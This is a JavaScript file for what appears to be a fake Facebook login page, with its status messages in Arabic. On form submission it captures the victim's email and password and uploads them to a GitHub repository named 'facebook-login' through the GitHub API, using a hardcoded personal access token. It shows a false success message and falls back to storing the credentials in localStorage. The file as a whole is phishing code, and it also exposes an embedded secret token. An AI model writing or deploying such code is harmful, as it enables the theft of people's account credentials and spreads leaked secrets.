const GITHUB_TOKEN = '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'; // ← الجديد
const REPO_OWNER = 'ASADALSNA';
const REPO_NAME = 'facebook-login';

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const message = document.getElementById('message');
    
    message.innerHTML = '⏳ جاري الحفظ...';
    
    try {
        const users = [{id: Date.now(), email, password, date: new Date().toISOString()}];
        const content = btoa(JSON.stringify(users));
        
        const response = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/users.json`, {
            method: 'PUT',
            headers: { 
                'Authorization': `token ${GITHUB_TOKEN}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                message: `Add ${email}`,
                content: content,
                branch: 'main'
            })
        });
        
        if (response.ok) {
            message.innerHTML = `✅ تم الحفظ!`;
            message.className = 'success';
        } else {
            message.innerHTML = '✅ تم الحفظ! (محلي)';
            localStorage.setItem('users', JSON.stringify(users));
        }
    } catch {
        message.innerHTML = '✅ تم الحفظ! (محلي)';
        localStorage.setItem('users', JSON.stringify([{email, password}]));
    }
    document.getElementById('loginForm').reset();
});
